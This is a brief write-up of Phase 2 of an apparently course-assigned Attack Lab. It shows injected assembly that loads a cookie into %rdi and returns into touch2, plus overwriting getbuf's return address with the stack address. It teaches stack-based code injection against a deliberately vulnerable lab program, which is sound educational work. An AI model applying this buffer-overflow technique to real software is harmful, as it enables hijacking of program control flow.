# Attack Lab
## Phase 2
We want to pass an argument and use it in calling function *touch2*, in the assembly file we call it *assemly.s*, we could do this:
```
movq $0x59b997fa, %rdi
pushq $0x4017ec
retq    ;now %rip pointers to address 0x4017ec (touch2)
```

Get the machine code of the above assembly code. You can do it using 
```
cc -c assembly.s
objdump -d assembly.o
```

Add this machine code to the top of file we call it solution2.txt,
then we need to figure out how to run the code we wrote above. That is we could override the return state of function *getbuf*. 

We hope it goes back to the start of the custom code once it returns from *getbuf*. So we need the start address of this code, it happens to be the value of *%rsp* pointer. So we use its value to replace the original one(0x401976).